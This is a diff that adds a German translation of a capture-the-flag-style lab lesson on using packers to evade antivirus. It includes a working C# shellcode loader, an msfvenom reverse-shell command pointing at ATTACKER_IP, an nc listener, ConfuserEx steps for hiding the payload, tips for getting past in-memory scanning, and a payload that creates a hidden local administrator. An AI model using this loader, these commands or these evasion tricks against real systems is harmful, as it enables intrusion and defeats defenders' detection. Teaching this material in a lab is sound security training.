@@ -922,3 +922,147 @@ Versuchen Sie, diese Technik (Kombination aus Encoding und Verschlüsselung) auf
 ```
 Keine Antwort nötig
 ```
+
+# Task 9 - Packers
+Eine weitere Methode, um die Erkennung durch AV-Software auf der Festplatte zu umgehen, ist die Verwendung eines Packers. **Packer** sind Softwaretools, die ein Programm als Eingabe nehmen und es so transformieren, dass seine Struktur anders aussieht, aber die Funktionalität genau gleich bleibt. Packer verfolgen dabei hauptsächlich zwei Ziele:
+
+- Das Programm komprimieren, damit es weniger Platz einnimmt.
+- Das Programm allgemein vor Reverse Engineering schützen.
+
+Packer werden häufig von Softwareentwicklern verwendet, die ihre Software vor Reverse Engineering oder Crackversuchen schützen möchten. Sie bieten einen gewissen Schutz, indem sie eine Mischung aus Transformationen implementieren, die Komprimierung, Verschlüsselung, das Hinzufügen von Debug-Schutzmaßnahmen und viele andere Techniken umfassen. Wie Sie sich vielleicht schon denken können, werden Packer auch häufig verwendet, um Malware zu verschleiern, ohne viel Aufwand betreiben zu müssen.
+
+Es gibt eine Vielzahl von Packern, darunter UPX, MPRESS, Themida und viele andere.
+
+### Anwendung eines Packers
+
+Obwohl jeder Packer unterschiedlich arbeitet, betrachten wir ein einfaches Beispiel dafür, was ein grundlegender Packer tun würde.
+
+Wenn eine Anwendung gepackt wird, wird sie durch eine Packing-Funktion auf irgendeine Weise transformiert. Die Packing-Funktion muss in der Lage sein, den Originalcode der Anwendung zu verschleiern und zu transformieren, so dass er durch eine Unpacking-Funktion wieder vernünftig zurückgeführt werden kann, um die ursprüngliche Funktionalität der Anwendung zu erhalten. Manchmal fügt der Packer möglicherweise zusätzlichen Code hinzu (um beispielsweise das Debuggen der Anwendung zu erschweren), aber im Allgemeinen möchte er den ursprünglichen von Ihnen geschriebenen Code wiederherstellen können, wenn er ausgeführt wird.
+![Software-Verpackungsprozessdiagramm](Bilder/2024-07-05-Software-Verpackungsprozessdiagramm.png)
+
+Die gepackte Version der Anwendung wird Ihren gepackten Anwendungscode enthalten. Da dieser neue gepackte Code verschleiert ist, muss die Anwendung in der Lage sein, den ursprünglichen Code daraus zu entpacken. Zu diesem Zweck wird der Packer einen Code-Stub einbetten, der einen Unpacker enthält, und den Haupt-Einstiegspunkt der ausführbaren Datei darauf umleiten.
+
+Wenn Ihre gepackte Anwendung ausgeführt wird, wird Folgendes passieren:
+![Entpackungsprozess für MyApp-packed.exe](Bilder/2024-07-05-Entpackungsprozess-für-MyApp-packed.exe.png)
+
+1. Der Unpacker wird zuerst ausgeführt, da er der Einstiegspunkt der ausführbaren Datei ist.
+2. Der Unpacker liest den gepackten Anwendungscode.
+3. Der Unpacker schreibt den originalen, entpackten Code an einer Stelle im Speicher und lenkt den Ausführungsfluss der Anwendung darauf.
+
+### Packer und AV-Programme
+
+Bis jetzt sehen wir, wie Packer helfen können, AV-Lösungen zu umgehen. Angenommen, Sie haben eine ausführbare Datei für eine Reverse Shell erstellt, aber das AV-Programm erkennt sie als schädlich, weil sie mit einer bekannten Signatur übereinstimmt. In diesem Fall wird durch die Verwendung eines Packers die ausführbare Datei für die Reverse Shell so transformiert, dass sie keine bekannten Signaturen auf der Festplatte mehr erfüllt. Dadurch sollten Sie in der Lage sein, Ihren Payload ohne größere Probleme auf die Festplatte einer beliebigen Maschine zu verteilen.
+
+Dennoch könnten AV-Lösungen Ihre gepackte Anwendung aus einigen Gründen erkennen:
+
+- Obwohl Ihr ursprünglicher Code möglicherweise in etwas Unkenntliches transformiert wird, enthält die gepackte ausführbare Datei einen Stub mit dem Code des Unpackers. Wenn der Unpacker eine bekannte Signatur hat, könnten AV-Lösungen allein aufgrund des Unpacker-Stubs jede gepackte ausführbare Datei kennzeichnen.
+- Irgendwann wird Ihre Anwendung den ursprünglichen Code in den Speicher entpacken, damit er ausgeführt werden kann. Wenn die AV-Lösung, die Sie umgehen möchten, in der Lage ist, Scans im Speicher durchzuführen, könnten Sie möglicherweise immer noch erkannt werden, nachdem Ihr Code entpackt wurde.
+
+### Verpacken unseres Shellcodes
+
+Lassen Sie uns mit einem grundlegenden C#-Shellcode beginnen. Sie finden diesen Code auch auf Ihrem Windows-Rechner unter C:\Tools\CS Files\UnEncStagelessPayload.cs:
+```cs
+using System;
+using System.Net;
+using System.Text;
+using System.Configuration.Install;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography.X509Certificates;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+  public static void Main()
+  {
+    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };
+
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+```
+
+Dieser Payload nimmt einen Shellcode, der von msfvenom generiert wurde, und führt ihn in einem separaten Thread aus. Damit dies funktioniert, müssen Sie einen neuen Shellcode generieren und ihn in die Variable `shellcode` des Codes einfügen:
+```cmd
+user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
+```
+
+Anschließend können Sie Ihren Payload auf dem Windows-Rechner mit dem folgenden Befehl kompilieren:
+```cmd
+C:\> csc UnEncStagelessPayload.cs
+```
+
+Sobald Sie eine funktionierende ausführbare Datei haben, können Sie versuchen, sie auf der THM Antivirus Check! Seite hochzuladen (Link auf dem Desktop). Sie sollte sofort vom AV markiert werden. Lassen Sie uns denselben Payload mit einem Packer versehen und sehen, was passiert.
+
+Für diese Aufgabe werden wir den [ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0) Packer verwenden, da unsere Payloads auf `.NET` programmiert sind. Für Ihre Bequemlichkeit finden Sie eine Verknüpfung dazu auf Ihrem Desktop.
+
+ConfuserEx wird Sie auffordern, die Ordner anzugeben, in denen es arbeiten soll. Stellen Sie sicher, dass Sie Ihren Desktop als Basisverzeichnis auswählen, wie im Bild unten gezeigt. Sobald das Basisverzeichnis eingerichtet ist, ziehen Sie die ausführbare Datei, die Sie packen möchten, auf die Oberfläche, und Sie sollten folgendes Ergebnis erhalten:
+![Confuser.Core Software-Benutzeroberfläche](Bilder/2024-07-05-Confuser.Core-Software-Benutzeroberfläche.png)
+
+Lassen Sie uns zum Einstellungs-Tab gehen und unseren Payload auswählen. Sobald ausgewählt, klicken Sie auf die Schaltfläche "+" , um Einstellungen zu Ihrem Payload hinzuzufügen. Dadurch sollte eine Regel namens "true" erstellt werden. Stellen Sie sicher, dass Sie auch die Komprimierung aktivieren:
+![Erklärung für Confuser.Core Software-Benutzeroberfläche](Bilder/2024-07-05-Erklärung-für-Confuser.Core-Software-Benutzeroberfläche.png)
+
+Jetzt werden wir die Regel "true" bearbeiten und sie auf das Maximum-Voreinstellung setzen:
+![Edit rule Bild](Bilder/2024-07-05-Edit-rule-Bild.png)
+
+Abschließend gehen wir zum Tab "Schützen!" und klicken auf "Schützen":
+![debug log](Bilder/2024-07-05-debug-log.png)
+
+Der neue Payload sollte nun bereit sein und hoffentlich keine Alarme auslösen, wenn er auf den THM Antivirus Checker (Verknüpfung auf Ihrem Desktop verfügbar) hochgeladen wird. Tatsächlich sollten Sie, wenn Sie Ihren Payload ausführen und einen `nc` Listener einrichten, eine Shell zurückbekommen:
+
+```shell
+user@attackbox$ nc -lvp 7478
+```
+
+Bis hierher gut, aber erinnern Sie sich daran, dass wir über AVs gesprochen haben, die In-Memory-Scans durchführen? Wenn Sie versuchen, einen Befehl auf Ihrer Reverse Shell auszuführen, wird das AV Ihre Shell bemerken und beenden. Dies liegt daran, dass Windows Defender bestimmte Windows-API-Aufrufe abfängt und bei Verwendung solcher API-Aufrufe In-Memory-Scans durchführt. Bei jeder mit msfvenom generierten Shell wird beispielsweise CreateProcess() aufgerufen und erkannt.
+
+### Was tun wir jetzt?
+
+Obwohl die Überwindung von In-Memory-Scans nicht im Rahmen dieses Raums liegt, gibt es ein paar einfache Dinge, die Sie tun können, um die Erkennung zu vermeiden:
+
+- **Warten Sie einfach einen Moment**. Versuchen Sie, die Reverse Shell erneut zu starten und warten Sie etwa 5 Minuten, bevor Sie einen Befehl senden. Sie werden sehen, dass das AV dann keine Beschwerden mehr führt. Der Grund dafür ist, dass das Scannen des Speichers eine ressourcenintensive Operation ist. Das AV wird es also eine Weile nach dem Start Ihres Prozesses tun, aber es wird schließlich aufhören.
+- **Verwenden Sie kleinere Payloads**. Je kleiner die Payload ist, desto weniger wahrscheinlich ist es, dass sie erkannt wird. Wenn Sie beispielsweise msfvenom verwenden, um einen einzelnen Befehl auszuführen, anstatt eine Reverse Shell zu erhalten, wird es für das AV schwieriger sein, sie zu erkennen. Versuchen Sie es mit dem Befehl `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` und sehen Sie, was passiert.
+
+Wenn die Erkennung kein Problem darstellt, können Sie sogar einen einfachen Trick anwenden. Führen Sie von Ihrer Reverse Shell aus erneut cmd.exe aus. Das AV wird Ihre Payload erkennen und den zugehörigen Prozess beenden, aber nicht das neue `cmd.exe`, das Sie gerade gestartet haben.
+
+Jedes AV-Programm verhält sich unterschiedlich, aber meistens gibt es einen ähnlichen Weg um sie herum, daher lohnt es sich, jedes seltsame Verhalten zu erkunden, das Sie beim Testen bemerken
+
+## Fragen:
+Helfen Packer Ihnen, Ihren bösartigen Code zu verschleiern, um AV-Lösungen zu umgehen? (yea/nay)
+```
+
+```
+
+Entpacken Packer oft den ursprünglichen Code im Speicher, bevor sie ihn ausführen? (yea/nay)
+```
+
+```
+
+Werden einige Packer von einigen AV-Lösungen als bösartig erkannt? (yea/nay)
+```
+
+```
+
+Folgen Sie den Anweisungen, um einen gepackten Payload zu erstellen und ihn auf dem THM Antivirus Check unter http://MACHINE_IP/ hochzuladen.
+```
+Keine Antwort nötig
+```
